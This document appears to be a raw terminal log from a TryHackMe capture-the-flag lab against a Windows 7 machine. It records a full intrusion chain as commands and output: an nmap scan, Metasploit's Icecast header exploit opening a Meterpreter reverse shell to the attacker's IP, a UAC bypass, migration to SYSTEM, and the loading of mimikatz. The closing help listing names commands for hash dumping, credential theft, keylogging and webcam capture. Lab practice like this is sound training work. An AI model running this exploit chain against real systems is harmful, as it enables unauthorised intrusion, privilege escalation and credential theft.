@@ -1,0 +1,727 @@
+┌──(anonymous㉿Unknown)-[~]
+└─$ sudo openvpn /home/anonymous/Works/TryHackMe/AbdulRahimK.ovpn
+[sudo] password for anonymous: 
+2022-04-22 04:20:18 WARNING: Compression for receiving enabled. Compression has been used in the past to break encryption. Sent packets are not compressed unless "allow-compression yes" is also set.
+2022-04-22 04:20:18 DEPRECATED OPTION: --cipher set to 'AES-256-CBC' but missing in --data-ciphers (AES-256-GCM:AES-128-GCM). Future OpenVPN version will ignore --cipher for cipher negotiations. Add 'AES-256-CBC' to --data-ciphers or change --cipher 'AES-256-CBC' to --data-ciphers-fallback 'AES-256-CBC' to silence this warning.
+2022-04-22 04:20:18 OpenVPN 2.5.6 x86_64-pc-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [PKCS11] [MH/PKTINFO] [AEAD] built on Mar 20 2022
+2022-04-22 04:20:18 library versions: OpenSSL 1.1.1n  15 Mar 2022, LZO 2.10
+2022-04-22 04:20:18 Outgoing Control Channel Authentication: Using 512 bit message hash 'SHA512' for HMAC authentication
+2022-04-22 04:20:18 Incoming Control Channel Authentication: Using 512 bit message hash 'SHA512' for HMAC authentication
+2022-04-22 04:20:18 TCP/UDP: Preserving recently used remote address: [AF_INET]18.202.129.195:1194
+2022-04-22 04:20:18 Socket Buffers: R=[212992->212992] S=[212992->212992]
+2022-04-22 04:20:18 UDP link local: (not bound)
+2022-04-22 04:20:18 UDP link remote: [AF_INET]18.202.129.195:1194
+2022-04-22 04:20:19 TLS: Initial packet from [AF_INET]18.202.129.195:1194, sid=837b8637 e410bb38
+2022-04-22 04:20:19 VERIFY OK: depth=1, CN=ChangeMe
+2022-04-22 04:20:19 VERIFY KU OK
+2022-04-22 04:20:19 Validating certificate extended key usage
+2022-04-22 04:20:19 ++ Certificate has EKU (str) TLS Web Server Authentication, expects TLS Web Server Authentication
+2022-04-22 04:20:19 VERIFY EKU OK
+2022-04-22 04:20:19 VERIFY OK: depth=0, CN=server
+2022-04-22 04:20:19 Control Channel: TLSv1.3, cipher TLSv1.3 TLS_AES_256_GCM_SHA384, peer certificate: 2048 bit RSA, signature: RSA-SHA256
+2022-04-22 04:20:19 [server] Peer Connection Initiated with [AF_INET]18.202.129.195:1194
+2022-04-22 04:20:20 SENT CONTROL [server]: 'PUSH_REQUEST' (status=1)
+2022-04-22 04:20:20 PUSH: Received control message: 'PUSH_REPLY,route 10.10.0.0 255.255.0.0,route-metric 1000,comp-lzo no,route-gateway 10.8.0.1,topology subnet,ping 5,ping-restart 120,ifconfig 10.8.73.220 255.255.0.0,peer-id 108'
+2022-04-22 04:20:20 OPTIONS IMPORT: timers and/or timeouts modified
+2022-04-22 04:20:20 OPTIONS IMPORT: compression parms modified
+2022-04-22 04:20:20 OPTIONS IMPORT: --ifconfig/up options modified
+2022-04-22 04:20:20 OPTIONS IMPORT: route options modified
+2022-04-22 04:20:20 OPTIONS IMPORT: route-related options modified
+2022-04-22 04:20:20 OPTIONS IMPORT: peer-id set
+2022-04-22 04:20:20 OPTIONS IMPORT: adjusting link_mtu to 1625
+2022-04-22 04:20:20 Using peer cipher 'AES-256-CBC'
+2022-04-22 04:20:20 Outgoing Data Channel: Cipher 'AES-256-CBC' initialized with 256 bit key
+2022-04-22 04:20:20 Outgoing Data Channel: Using 512 bit message hash 'SHA512' for HMAC authentication
+2022-04-22 04:20:20 Incoming Data Channel: Cipher 'AES-256-CBC' initialized with 256 bit key
+2022-04-22 04:20:20 Incoming Data Channel: Using 512 bit message hash 'SHA512' for HMAC authentication
+2022-04-22 04:20:20 net_route_v4_best_gw query: dst 0.0.0.0
+2022-04-22 04:20:20 net_route_v4_best_gw result: via 192.168.1.1 dev eth0
+2022-04-22 04:20:20 ROUTE_GATEWAY 192.168.1.1/255.255.255.0 IFACE=eth0 HWADDR=00:50:56:21:88:bb
+2022-04-22 04:20:20 TUN/TAP device tun0 opened
+2022-04-22 04:20:20 net_iface_mtu_set: mtu 1500 for tun0
+2022-04-22 04:20:20 net_iface_up: set tun0 up
+2022-04-22 04:20:20 net_addr_v4_add: 10.8.73.220/16 dev tun0
+2022-04-22 04:20:20 net_route_v4_add: 10.10.0.0/16 via 10.8.0.1 dev [NULL] table 0 metric 1000
+2022-04-22 04:20:20 WARNING: this configuration may cache passwords in memory -- use the auth-nocache option to prevent this
+2022-04-22 04:20:20 Initialization Sequence Completed
+
+====================================================================================================================
+MACHINE IP: 10.10.155.45		ATTACKER IP: 10.8.73.220
+
+====================================================================================================================
+┌──(root㉿Unknown)-[/home/anonymous]
+└─# nmap -A -p- -T4 10.10.9.192
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-22 05:50 EDT
+Stats: 0:00:21 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 5.07% done; ETC: 05:57 (0:06:33 remaining)
+Stats: 0:03:47 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 27.08% done; ETC: 06:04 (0:10:11 remaining)
+Stats: 0:09:27 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 58.74% done; ETC: 06:06 (0:06:38 remaining)
+Stats: 0:15:39 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 41.67% done; ETC: 06:06 (0:00:32 remaining)
+Nmap scan report for 10.10.9.192
+Host is up (0.20s latency).
+Not shown: 65523 closed tcp ports (reset)
+PORT      STATE SERVICE            VERSION
+135/tcp   open  msrpc              Microsoft Windows RPC
+139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
+3389/tcp  open  ssl/ms-wbt-server?
+| rdp-ntlm-info: 
+|   Target_Name: DARK-PC
+|   NetBIOS_Domain_Name: DARK-PC
+|   NetBIOS_Computer_Name: DARK-PC
+|   DNS_Domain_Name: Dark-PC
+|   DNS_Computer_Name: Dark-PC
+|   Product_Version: 6.1.7601
+|_  System_Time: 2022-04-22T10:07:18+00:00
+|_ssl-date: 2022-04-22T10:07:28+00:00; -1s from scanner time.
+| ssl-cert: Subject: commonName=Dark-PC
+| Not valid before: 2022-04-21T09:48:32
+|_Not valid after:  2022-10-21T09:48:32
+5357/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Service Unavailable
+8000/tcp  open  http               nIcecast streaming media server
+|_http-title: Site doesn't have a title (text/html).
+49152/tcp open  msrpc              Microsoft Windows RPC
+49153/tcp open  msrpc              Microsoft Windows RPC
+49154/tcp open  msrpc              Microsoft Windows RPC
+49158/tcp open  msrpc              Microsoft Windows RPC
+49159/tcp open  msrpc              Microsoft Windows RPC
+49160/tcp open  msrpc              Microsoft Windows RPC
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.92%E=4%D=4/22%OT=135%CT=1%CU=41434%PV=Y%DS=2%DC=T%G=Y%TM=62627E
+OS:61%P=x86_64-pc-linux-gnu)SEQ(SP=FE%GCD=1%ISR=104%TI=I%CI=I%II=I%SS=S%TS=
+OS:7)OPS(O1=M505NW8ST11%O2=M505NW8ST11%O3=M505NW8NNT11%O4=M505NW8ST11%O5=M5
+OS:05NW8ST11%O6=M505ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=200
+OS:0)ECN(R=Y%DF=Y%T=80%W=2000%O=M505NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S
+OS:+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%
+OS:T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=
+OS:0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%
+OS:S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(
+OS:R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=
+OS:N%T=80%CD=Z)
+
+Network Distance: 2 hops
+Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2022-04-22T10:07:18
+|_  start_date: 2022-04-22T09:48:31
+| smb-security-mode: 
+|   account_used: <blank>
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb-os-discovery: 
+|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
+|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
+|   Computer name: Dark-PC
+|   NetBIOS computer name: DARK-PC\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2022-04-22T05:07:18-05:00
+|_clock-skew: mean: 59m59s, deviation: 2h14m10s, median: -1s
+|_nbstat: NetBIOS name: DARK-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:ed:52:70:5c:91 (unknown)
+| smb2-security-mode: 
+|   2.1: 
+|_    Message signing enabled but not required
+
+TRACEROUTE (using port 21/tcp)
+HOP RTT       ADDRESS
+1   191.12 ms 10.8.0.1
+2   193.49 ms 10.10.9.192
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 1039.60 seconds
+
+===================================================================================================================
+┌──(root㉿Unknown)-[/home/anonymous]
+└─# msfconsole
+                                                  
+IIIIII    dTb.dTb        _.---._
+  II     4'  v  'B   .'"".'/|\`.""'.
+  II     6.     .P  :  .' / | \ `.  :
+  II     'T;. .;P'  '.'  /  |  \  `.'
+  II      'T; ;P'    `. /   |   \ .'
+IIIIII     'YvP'       `-.__|__.-'
+
+I love shells --egypt
+
+
+       =[ metasploit v6.1.27-dev                          ]
++ -- --=[ 2196 exploits - 1162 auxiliary - 400 post       ]
++ -- --=[ 596 payloads - 45 encoders - 10 nops            ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit tip: View all productivity tips with the 
+tips command
+
+msf6 > search icecast
+
+Matching Modules
+================
+
+   #  Name                                 Disclosure Date  Rank   Check  Description
+   -  ----                                 ---------------  ----   -----  -----------
+   0  exploit/windows/http/icecast_header  2004-09-28       great  No     Icecast Header Overwrite
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/icecast_header
+
+msf6 > use 0
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf6 exploit(windows/http/icecast_header) > options
+
+Module options (exploit/windows/http/icecast_header):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS                   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+   RPORT   8000             yes       The target port (TCP)
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.1.13     yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf6 exploit(windows/http/icecast_header) > set RHOSTS 10.10.2.227
+RHOSTS => 10.10.2.227
+msf6 exploit(windows/http/icecast_header) > set LHOST 10.8.73.220
+LHOST => 10.8.73.220
+msf6 exploit(windows/http/icecast_header) > 
+
+===================================================================================================================
+msf6 exploit(windows/http/icecast_header) > exploit
+
+[*] Started reverse TCP handler on 10.8.73.220:4444 
+[*] Sending stage (175174 bytes) to 10.10.2.227
+[*] Meterpreter session 1 opened (10.8.73.220:4444 -> 10.10.2.227:49193 ) at 2022-04-23 00:30:36 -0400
+
+meterpreter > ps
+
+Process List
+============
+
+ PID   PPID  Name                  Arch  Session  User          Path
+ ---   ----  ----                  ----  -------  ----          ----
+ 0     0     [System Process]
+ 4     0     System
+ 416   4     smss.exe
+ 496   692   svchost.exe
+ 544   536   csrss.exe
+ 584   692   svchost.exe
+ 592   536   wininit.exe
+ 604   584   csrss.exe
+ 652   584   winlogon.exe
+ 692   592   services.exe
+ 700   592   lsass.exe
+ 708   592   lsm.exe
+ 808   692   mscorsvw.exe
+ 820   692   svchost.exe
+ 888   692   svchost.exe
+ 908   692   TrustedInstaller.exe
+ 936   692   svchost.exe
+ 1064  692   svchost.exe
+ 1192  692   svchost.exe
+ 1300  496   dwm.exe               x64   1        Dark-PC\Dark  C:\Windows\System32\dwm.exe
+ 1320  1292  explorer.exe          x64   1        Dark-PC\Dark  C:\Windows\explorer.exe
+ 1372  692   spoolsv.exe
+ 1400  692   svchost.exe
+ 1420  820   WmiPrvSE.exe
+ 1440  692   taskhost.exe          x64   1        Dark-PC\Dark  C:\Windows\System32\taskhost.exe
+ 1564  692   amazon-ssm-agent.exe
+ 1644  692   LiteAgent.exe
+ 1684  692   svchost.exe
+ 1832  692   Ec2Config.exe
+ 2056  692   svchost.exe
+ 2256  692   vds.exe
+ 2428  808   mscorsvw.exe
+ 2500  1320  Icecast2.exe          x86   1        Dark-PC\Dark  C:\Program Files (x86)\Icecast2 Win32\Icecast2.exe
+ 2564  820   WmiPrvSE.exe
+ 2576  692   SearchIndexer.exe
+ 2832  820   rundll32.exe          x64   1        Dark-PC\Dark  C:\Windows\System32\rundll32.exe
+ 2872  2832  dinotify.exe          x64   1        Dark-PC\Dark  C:\Windows\System32\dinotify.exe
+ 3068  692   sppsvc.exe
+
+meterpreter > sysinfo
+Computer        : DARK-PC
+OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 2
+Meterpreter     : x86/windows
+meterpreter > run post/multi/recon/local_exploit_suggester
+
+[*] 10.10.2.227 - Collecting local exploits for x86/windows...
+[*] 10.10.2.227 - 40 exploit checks are being tried...
+[+] 10.10.2.227 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
+[-] 10.10.2.227 - Post interrupted by the console user
+meterpreter > run post/multi/recon/local_exploit_suggester
+
+[*] 10.10.2.227 - Collecting local exploits for x86/windows...
+[*] 10.10.2.227 - 40 exploit checks are being tried...
+[+] 10.10.2.227 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
+[+] 10.10.2.227 - exploit/windows/local/ikeext_service: The target appears to be vulnerable.
+[+] 10.10.2.227 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
+[+] 10.10.2.227 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
+[+] 10.10.2.227 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
+[+] 10.10.2.227 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
+[+] 10.10.2.227 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
+[+] 10.10.2.227 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
+[+] 10.10.2.227 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
+[+] 10.10.2.227 - exploit/windows/local/tokenmagic: The target appears to be vulnerable.
+meterpreter > 
+Background session 1? [y/N]  y
+[-] Unknown command: y
+msf6 exploit(windows/http/icecast_header) > sessions -l
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information             Connection
+  --  ----  ----                     -----------             ----------
+  1         meterpreter x86/windows  Dark-PC\Dark @ DARK-PC  10.8.73.220:4444 -> 10.10.2.227:49193  (10.10.2.227)
+
+msf6 exploit(windows/http/icecast_header) > use exploit/windows/local/bypassuac_eventvwr
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf6 exploit(windows/local/bypassuac_eventvwr) > options
+
+Module options (exploit/windows/local/bypassuac_eventvwr):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION                   yes       The session to run this module on
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.1.13     yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows x86
+
+
+msf6 exploit(windows/local/bypassuac_eventvwr) > set SESSION 1
+SESSION => 1
+msf6 exploit(windows/local/bypassuac_eventvwr) > set LHOST 10.8.73.220
+LHOST => 10.8.73.220
+msf6 exploit(windows/local/bypassuac_eventvwr) > exploit
+
+[*] Started reverse TCP handler on 10.8.73.220:4444 
+[*] UAC is Enabled, checking level...
+[+] Part of Administrators group! Continuing...
+[+] UAC is set to Default
+[+] BypassUAC can bypass this setting, continuing...
+[*] Configuring payload and stager registry keys ...
+[*] Executing payload: C:\Windows\SysWOW64\eventvwr.exe
+[+] eventvwr.exe executed successfully, waiting 10 seconds for the payload to execute.
+[*] Sending stage (175174 bytes) to 10.10.2.227
+[*] Meterpreter session 2 opened (10.8.73.220:4444 -> 10.10.2.227:49209 ) at 2022-04-23 00:42:18 -0400
+[*] Cleaning up registry keys ...
+
+meterpreter > 
+
+===================================================================================================================
+meterpreter > sessions 2
+[*] Session 2 is already interactive.
+meterpreter > getprivs
+
+Enabled Process Privileges
+==========================
+
+Name
+----
+SeBackupPrivilege
+SeChangeNotifyPrivilege
+SeCreateGlobalPrivilege
+SeCreatePagefilePrivilege
+SeCreateSymbolicLinkPrivilege
+SeDebugPrivilege
+SeImpersonatePrivilege
+SeIncreaseBasePriorityPrivilege
+SeIncreaseQuotaPrivilege
+SeIncreaseWorkingSetPrivilege
+SeLoadDriverPrivilege
+SeManageVolumePrivilege
+SeProfileSingleProcessPrivilege
+SeRemoteShutdownPrivilege
+SeRestorePrivilege
+SeSecurityPrivilege
+SeShutdownPrivilege
+SeSystemEnvironmentPrivilege
+SeSystemProfilePrivilege
+SeSystemtimePrivilege
+SeTakeOwnershipPrivilege
+SeTimeZonePrivilege
+SeUndockPrivilege
+
+meterpreter > 
+
+===================================================================================================================
+meterpreter > ps
+
+Process List
+============
+
+ PID   PPID  Name                  Arch  Session  User                          Path
+ ---   ----  ----                  ----  -------  ----                          ----
+ 0     0     [System Process]
+ 4     0     System                x64   0
+ 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe
+ 540   816   WmiPrvSE.exe          x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\wbem\WmiPrvSE.exe
+ 544   536   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
+ 584   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 592   536   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe
+ 604   584   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
+ 652   584   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
+ 692   592   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe
+ 700   592   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
+ 708   592   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsm.exe
+ 816   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 884   692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
+ 932   692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 1000  692   vds.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\vds.exe
+ 1020  692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 1060  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 1188  692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
+ 1204  692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
+ 1296  1020  dwm.exe               x64   1        Dark-PC\Dark                  C:\Windows\System32\dwm.exe
+ 1312  1288  explorer.exe          x64   1        Dark-PC\Dark                  C:\Windows\explorer.exe
+ 1368  692   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
+ 1396  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 1408  604   conhost.exe           x64   1        Dark-PC\Dark                  C:\Windows\System32\conhost.exe
+ 1436  692   taskhost.exe          x64   1        Dark-PC\Dark                  C:\Windows\System32\taskhost.exe
+ 1548  692   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
+ 1636  692   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Xentools\LiteAgent.exe
+ 1676  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 1796  2876  mscorsvw.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscorsvw.exe
+ 1816  692   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
+ 1968  692   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\sppsvc.exe
+ 2028  604   conhost.exe           x64   1        Dark-PC\Dark                  C:\Windows\System32\conhost.exe
+ 2032  2368  powershell.exe        x86   1        Dark-PC\Dark                  C:\Windows\SysWOW64\WindowsPowershell\v1.0\powershell.exe
+ 2120  2272  cmd.exe               x86   1        Dark-PC\Dark                  C:\Windows\SysWOW64\cmd.exe
+ 2272  1312  Icecast2.exe          x86   1        Dark-PC\Dark                  C:\Program Files (x86)\Icecast2 Win32\Icecast2.exe
+ 2352  692   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\servicing\TrustedInstaller.exe
+ 2548  692   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\SearchIndexer.exe
+ 2792  816   rundll32.exe          x64   1        Dark-PC\Dark                  C:\Windows\System32\rundll32.exe
+ 2836  2792  dinotify.exe          x64   1        Dark-PC\Dark                  C:\Windows\System32\dinotify.exe
+ 2876  692   mscorsvw.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscorsvw.exe
+ 2952  604   conhost.exe           x64   1        Dark-PC\Dark                  C:\Windows\System32\conhost.exe
+ 3040  2272  cmd.exe               x86   1        Dark-PC\Dark                  C:\Windows\SysWOW64\cmd.exe
+
+meterpreter > 
+
+===================================================================================================================
+meterpreter > migrate -N spoolsv.exe
+[*] Migrating from 2032 to 1368...
+[*] Migration completed successfully.
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter > 
+
+===================================================================================================================
+meterpreter > load kiwi
+Loading extension kiwi...
+  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
+  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/
+
+Success.
+meterpreter > help
+
+Core Commands
+=============
+
+    Command                   Description
+    -------                   -----------
+    ?                         Help menu
+    background                Backgrounds the current session
+    bg                        Alias for background
+    bgkill                    Kills a background meterpreter script
+    bglist                    Lists running background scripts
+    bgrun                     Executes a meterpreter script as a background thread
+    channel                   Displays information or control active channels
+    close                     Closes a channel
+    detach                    Detach the meterpreter session (for http/https)
+    disable_unicode_encoding  Disables encoding of unicode strings
+    enable_unicode_encoding   Enables encoding of unicode strings
+    exit                      Terminate the meterpreter session
+    get_timeouts              Get the current session timeout values
+    guid                      Get the session GUID
+    help                      Help menu
+    info                      Displays information about a Post module
+    irb                       Open an interactive Ruby shell on the current session
+    load                      Load one or more meterpreter extensions
+    machine_id                Get the MSF ID of the machine attached to the session
+    migrate                   Migrate the server to another process
+    pivot                     Manage pivot listeners
+    pry                       Open the Pry debugger on the current session
+    quit                      Terminate the meterpreter session
+    read                      Reads data from a channel
+    resource                  Run the commands stored in a file
+    run                       Executes a meterpreter script or Post module
+    secure                    (Re)Negotiate TLV packet encryption on the session
+    sessions                  Quickly switch to another session
+    set_timeouts              Set the current session timeout values
+    sleep                     Force Meterpreter to go quiet, then re-establish session
+    ssl_verify                Modify the SSL certificate verification setting
+    transport                 Manage the transport mechanisms
+    use                       Deprecated alias for "load"
+    uuid                      Get the UUID for the current session
+    write                     Writes data to a channel
+
+
+Stdapi: File system Commands
+============================
+
+    Command       Description
+    -------       -----------
+    cat           Read the contents of a file to the screen
+    cd            Change directory
+    checksum      Retrieve the checksum of a file
+    cp            Copy source to destination
+    del           Delete the specified file
+    dir           List files (alias for ls)
+    download      Download a file or directory
+    edit          Edit a file
+    getlwd        Print local working directory
+    getwd         Print working directory
+    lcd           Change local working directory
+    lls           List local files
+    lpwd          Print local working directory
+    ls            List files
+    mkdir         Make directory
+    mv            Move source to destination
+    pwd           Print working directory
+    rm            Delete the specified file
+    rmdir         Remove directory
+    search        Search for files
+    show_mount    List all mount points/logical drives
+    upload        Upload a file or directory
+
+
+Stdapi: Networking Commands
+===========================
+
+    Command       Description
+    -------       -----------
+    arp           Display the host ARP cache
+    getproxy      Display the current proxy configuration
+    ifconfig      Display interfaces
+    ipconfig      Display interfaces
+    netstat       Display the network connections
+    portfwd       Forward a local port to a remote service
+    resolve       Resolve a set of host names on the target
+    route         View and modify the routing table
+
+
+Stdapi: System Commands
+=======================
+
+    Command       Description
+    -------       -----------
+    clearev       Clear the event log
+    drop_token    Relinquishes any active impersonation token.
+    execute       Execute a command
+    getenv        Get one or more environment variable values
+    getpid        Get the current process identifier
+    getprivs      Attempt to enable all privileges available to the current process
+    getsid        Get the SID of the user that the server is running as
+    getuid        Get the user that the server is running as
+    kill          Terminate a process
+    localtime     Displays the target system local date and time
+    pgrep         Filter processes by name
+    pkill         Terminate processes by name
+    ps            List running processes
+    reboot        Reboots the remote computer
+    reg           Modify and interact with the remote registry
+    rev2self      Calls RevertToSelf() on the remote machine
+    shell         Drop into a system command shell
+    shutdown      Shuts down the remote computer
+    steal_token   Attempts to steal an impersonation token from the target process
+    suspend       Suspends or resumes a list of processes
+    sysinfo       Gets information about the remote system, such as OS
+
+
+Stdapi: User interface Commands
+===============================
+
+    Command        Description
+    -------        -----------
+    enumdesktops   List all accessible desktops and window stations
+    getdesktop     Get the current meterpreter desktop
+    idletime       Returns the number of seconds the remote user has been idle
+    keyboard_send  Send keystrokes
+    keyevent       Send key events
+    keyscan_dump   Dump the keystroke buffer
+    keyscan_start  Start capturing keystrokes
+    keyscan_stop   Stop capturing keystrokes
+    mouse          Send mouse events
+    screenshare    Watch the remote user desktop in real time
+    screenshot     Grab a screenshot of the interactive desktop
+    setdesktop     Change the meterpreters current desktop
+    uictl          Control some of the user interface components
+
+
+Stdapi: Webcam Commands
+=======================
+
+    Command        Description
+    -------        -----------
+    record_mic     Record audio from the default microphone for X seconds
+    webcam_chat    Start a video chat
+    webcam_list    List webcams
+    webcam_snap    Take a snapshot from the specified webcam
+    webcam_stream  Play a video stream from the specified webcam
+
+
+Stdapi: Audio Output Commands
+=============================
+
+    Command       Description
+    -------       -----------
+    play          play a waveform audio file (.wav) on the target system
+
+
+Priv: Elevate Commands
+======================
+
+    Command       Description
+    -------       -----------
+    getsystem     Attempt to elevate your privilege to that of local system.
+
+
+Priv: Password database Commands
+================================
+
+    Command       Description
+    -------       -----------
+    hashdump      Dumps the contents of the SAM database
+
+
+Priv: Timestomp Commands
+========================
+
+    Command       Description
+    -------       -----------
+    timestomp     Manipulate file MACE attributes
+
+
+Kiwi Commands
+=============
+
+    Command                Description
+    -------                -----------
+    creds_all              Retrieve all credentials (parsed)
+    creds_kerberos         Retrieve Kerberos creds (parsed)
+    creds_livessp          Retrieve Live SSP creds
+    creds_msv              Retrieve LM/NTLM creds (parsed)
+    creds_ssp              Retrieve SSP creds
+    creds_tspkg            Retrieve TsPkg creds (parsed)
+    creds_wdigest          Retrieve WDigest creds (parsed)
+    dcsync                 Retrieve user account information via DCSync (unparsed)
+    dcsync_ntlm            Retrieve user account NTLM hash, SID and RID via DCSync
+    golden_ticket_create   Create a golden kerberos ticket
+    kerberos_ticket_list   List all kerberos tickets (unparsed)
+    kerberos_ticket_purge  Purge any in-use kerberos tickets
+    kerberos_ticket_use    Use a kerberos ticket
+    kiwi_cmd               Execute an arbitary mimikatz command (unparsed)
+    lsa_dump_sam           Dump LSA SAM (unparsed)
+    lsa_dump_secrets       Dump LSA secrets (unparsed)
+    password_change        Change the password/hash of a user
+    wifi_list              List wifi profiles/creds for the current user
